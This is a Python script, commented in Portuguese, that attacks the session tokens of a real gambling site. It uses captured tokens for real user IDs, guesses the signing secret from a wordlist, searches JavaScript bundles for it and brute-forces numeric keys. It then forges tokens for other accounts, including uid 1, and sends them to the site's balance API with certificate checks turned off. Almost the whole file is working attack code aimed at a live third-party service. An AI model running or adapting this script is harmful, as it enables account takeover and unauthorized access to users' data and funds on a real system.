"""
tool_token_cracker.py
=====================
Tenta descobrir o secret do HMAC usado no token:
  format: uid:timestamp:port:md5_hash

Estratégias:
  A. Wordlist de secrets comuns
  B. Secrets baseados em dados do app (packageName, domain, etc)
  C. Análise do algoritmo (MD5 vs SHA, salt position)
  D. Força bruta curta (0-9, 4-8 chars)
  E. Verifica se o secret está no bundle JS
  F. Se descobrir: forja token válido e testa
"""
import hashlib, hmac, itertools, string, json, ssl
import urllib.request, urllib.error, re, glob, time
from datetime import datetime

ctx = ssl.create_default_context()
ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
BASE = "https://ds.amizade777.com"

# Token real capturado em sessão
KNOWN_TOKENS = [
    # (uid, timestamp, port, hash)
    ("137027", "1781043965", "3001", "80bb3263b09ed712ba34fa72dc279f3e"),
    ("137027", "1781040662", "3001", "f725d49baf0ecf22833647d8ac8ea9bb"),
    ("137027", "1781038895", "3001", "bc38b05136af173b01edc740774d8a77"),
    ("207587", "1781026736", "3001", "3d1022d4885108c66afee70e43c58ebc"),
]

# ─── helpers ──────────────────────────────────────────────────

def try_hash(uid, ts, port, secret, algorithm="md5"):
    """Tenta calcular o hash com diversas combinações."""
    candidates = [
        f"{uid}:{ts}:{port}",
        f"{uid}:{ts}:{port}:{secret}",
        f"{uid}{ts}{port}",
        f"{uid}{ts}{port}{secret}",
        f"{secret}:{uid}:{ts}:{port}",
        f"{secret}{uid}{ts}{port}",
        f"{uid}:{ts}:{secret}:{port}",
        f"{uid}:{port}:{ts}:{secret}",
        f"{secret}",
        f"{uid}:{ts}",
    ]
    if algorithm == "md5":
        for c in candidates:
            if hashlib.md5(c.encode()).hexdigest() == secret:
                return f"MD5({c!r})"
    elif algorithm == "sha1":
        for c in candidates:
            if hashlib.sha1(c.encode()).hexdigest()[:32] == secret:
                return f"SHA1({c!r})"
    return None

def try_hmac(uid, ts, port, known_hash, secret, algorithm="md5"):
    """Testa HMAC com o secret."""
    for msg in [
        f"{uid}:{ts}:{port}",
        f"{uid}{ts}{port}",
        f"{uid}:{ts}",
        f"{uid}",
    ]:
        for algo in [hashlib.md5, hashlib.sha1, hashlib.sha256]:
            h = hmac.new(secret.encode(), msg.encode(), algo).hexdigest()
            if h[:32] == known_hash or h == known_hash:
                return f"HMAC-{algo.__name__}(key={secret!r}, msg={msg!r})"
    return None

def verify_token_works(uid, ts, port, hash_val):
    """Verifica se um token forjado funciona na API."""
    token = f"{uid}:{ts}:{port}:{hash_val}"
    h = {"Token": token, "User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    try:
        r = urllib.request.Request(BASE+"/japi/user/balance/querySimpleBalance", headers=h)
        with urllib.request.urlopen(r, timeout=8, context=ctx) as resp:
            b = json.loads(resp.read())
            return b.get("code") == 200, b.get("data")
    except Exception as ex:
        return False, str(ex)

# ─── A. Wordlist de secrets comuns ────────────────────────────

print("=" * 60)
print("A. WORDLIST DE SECRETS COMUNS")
print("=" * 60)

SECRET_WORDLIST = [
    # Vazios
    "", " ", "0", "1",
    # Relacionados ao app
    "com.slots.big", "slots.big", "slots", "big",
    "amizade777", "amizade", "777", "rainha777",
    "rainha777slots", "megaslott", "aphrodite777",
    "slots777", "cassino777", "casino777",
    # Relacionados à infra
    "3001", "server", "backend", "api", "prod",
    "prod-api", "japi", "gameapi", "gameserver",
    # Senhas comuns
    "secret", "secret123", "mysecret", "token_secret",
    "jwt_secret", "hmac_secret", "app_secret",
    "123456", "password", "qwerty", "admin", "admin123",
    "1234567890", "abcdefgh",
    # Baseados nos dados encontrados
    "goldenpay", "penko", "megaslots", "mega",
    "ccgamevip", "ccgame", "vip", "game",
    # Chave de debug comum em templates chineses
    "hskj2021", "hskj2022", "hskj2023", "hskj2024",
    "yxgame", "yxgame2023", "yxgame2024",
    "xinyu", "xinyugame", "xygame",
    "ab12cd34", "key123456",
    # Port como secret
    "3001port", "port3001",
    # IP interno como secret
    "172.16.0.245", "192.10.0.168", "10.0.0.1",
    # App version
    "1.0.0", "1.0.1", "2.0.0",
    # Combinações
    "com.slots.big_3001", "slots777_secret",
    "rainha_secret", "amizade_secret",
    # UUIDs parciais (do deviceId)
    "0beb614f", "8838", "43ef",
    # Nomes de serviço
    "payment", "recharge", "player", "websocket",
    "nodeapi", "springboot", "redis", "mysql",
    # Nada além disso por hora
]

found_secret = None
for uid, ts, port, known_hash in KNOWN_TOKENS[:2]:  # Usa 2 tokens pra cross-check
    for secret in SECRET_WORDLIST:
        # Testa MD5 puro
        for msg in [
            f"{uid}:{ts}:{port}",
            f"{uid}:{ts}:{port}:{secret}",
            f"{secret}:{uid}:{ts}:{port}",
            f"{uid}{ts}{port}{secret}",
            f"{secret}{uid}{ts}{port}",
            f"{uid}:{ts}:{port}{secret}",
        ]:
            if hashlib.md5(msg.encode()).hexdigest() == known_hash:
                print(f"  🔴 SECRET ENCONTRADO!")
                print(f"  Formula: MD5({msg!r})")
                print(f"  Secret: {secret!r}")
                found_secret = secret
                break
        if found_secret: break

        # Testa HMAC-MD5
        for msg in [f"{uid}:{ts}:{port}", f"{uid}{ts}{port}", f"{uid}:{ts}"]:
            for algo in [hashlib.md5, hashlib.sha256, hashlib.sha1]:
                try:
                    h = hmac.new(secret.encode(), msg.encode(), algo).hexdigest()[:32]
                    if h == known_hash:
                        print(f"  🔴 SECRET ENCONTRADO!")
                        print(f"  Formula: HMAC-{algo.__name__}(key={secret!r}, msg={msg!r})")
                        found_secret = secret
                        break
                except Exception:
                    pass
            if found_secret: break
        if found_secret: break
    if found_secret: break

if not found_secret:
    print(f"  Wordlist de {len(SECRET_WORDLIST)} secrets: nenhum match.")

# ─── B. Extração do secret do bundle JS ───────────────────────

print("\n" + "=" * 60)
print("B. BUSCA DO SECRET NO BUNDLE JS")
print("=" * 60)

bundle_files = glob.glob("bundles/*.js") + glob.glob("pa_bundles/*.js")
for fp in bundle_files:
    try:
        with open(fp, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except: continue

    # Buscar padrões de secret/key próximos a "md5" ou "hmac"
    for m in re.finditer(r'.{0,60}(?:md5|hmac|secret|sign|hash).{0,60}', content, re.I):
        ctx_str = m.group(0)
        # Filtrar: só mostra se tiver string de 8+ chars que parece um secret
        secrets_in_ctx = re.findall(r'["\']([a-zA-Z0-9_\-]{8,40})["\']', ctx_str)
        for s in secrets_in_ctx:
            if s not in ("undefined","function","prototype","arguments","toString"):
                print(f"  {fp.split('/')[-1]}: {ctx_str[:150]!r}")
                break

# ─── C. Brute force curto (dígitos 4-6) ─────────────────────

print("\n" + "=" * 60)
print("C. BRUTE FORCE NUMÉRICO (4-6 dígitos)")
print("=" * 60)

uid, ts, port, known_hash = KNOWN_TOKENS[0]
count = 0
for length in range(4, 7):
    for combo in itertools.product(string.digits, repeat=length):
        secret = "".join(combo)
        msg = f"{uid}:{ts}:{port}:{secret}"
        if hashlib.md5(msg.encode()).hexdigest() == known_hash:
            print(f"  🔴 SECRET NUMÉRICO ENCONTRADO: {secret!r}")
            found_secret = secret
            break
        msg2 = f"{uid}:{ts}:{port}"
        # HMAC-MD5 com secret numérico
        h = hmac.new(secret.encode(), msg2.encode(), hashlib.md5).hexdigest()[:32]
        if h == known_hash:
            print(f"  🔴 HMAC SECRET NUMÉRICO: {secret!r}")
            found_secret = secret
            break
        count += 1
        if count % 100000 == 0:
            print(f"  Tentativas: {count:,}...")
    if found_secret: break

if not found_secret:
    print(f"  {count:,} combinações testadas. Sem match.")

# ─── D. Se secreto encontrado: forja token e testa ───────────

if found_secret:
    print("\n" + "=" * 60)
    print("D. FORJANDO TOKEN COM SECRET DESCOBERTO")
    print("=" * 60)

    import time as time_mod
    now_ts = str(int(time_mod.time()))

    for target_uid in [1, 137027, 137028]:
        msg = f"{target_uid}:{now_ts}:3001:{found_secret}"
        forged_hash = hashlib.md5(msg.encode()).hexdigest()
        forged_token = f"{target_uid}:{now_ts}:3001:{forged_hash}"
        ok, data = verify_token_works(target_uid, now_ts, "3001", forged_hash)
        print(f"  uid={target_uid}: {'🔴 FUNCIONA!' if ok else '❌ rejeitado'}")
        if ok:
            print(f"    Token forjado: {forged_token}")
            print(f"    Data: {data}")
        time_mod.sleep(0.3)
else:
    print("\n  Secret não encontrado por nenhum método.")
    print("  O secret provavelmente é longo e aleatório (gerado na inicialização do servidor).")
    print("  Recomendação: auditar o código-fonte do backend diretamente.")

print(f"\n✅ token_cracker concluído em {datetime.now().isoformat()}")
